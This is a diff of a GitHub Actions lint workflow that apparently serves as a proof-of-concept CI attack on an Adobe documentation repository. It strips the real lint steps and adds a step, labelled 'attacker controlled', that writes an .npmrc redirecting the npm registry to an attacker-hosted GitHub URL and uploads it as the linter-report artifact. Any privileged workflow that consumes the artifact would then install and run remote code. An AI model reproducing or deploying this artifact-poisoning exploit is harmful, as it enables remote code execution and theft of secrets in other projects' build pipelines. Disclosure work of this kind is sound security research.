@@ -1,49 +1,28 @@
----
 name: Lint
 on:
   pull_request:
     branches: [main]
-
+permissions:
+  contents: read
 jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
       - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
+        run: echo "${{ github.event.pull_request.number }}" > pr-number.txt
+      - name: Build artifact contents (attacker controlled)
+        run: |
+          mkdir -p out
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-postlint/adp-rce/npmreg/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
+          printf 'attacker controlled linter report\n' > out/linter-report.txt
+          cp pr-number.txt out/pr-number.txt
+          cat out/.npmrc
       - name: Upload linter report
-        if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
-            linter-report.txt
-            pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
+            out/.npmrc
+            out/linter-report.txt
+            out/pr-number.txt
+          include-hidden-files: true
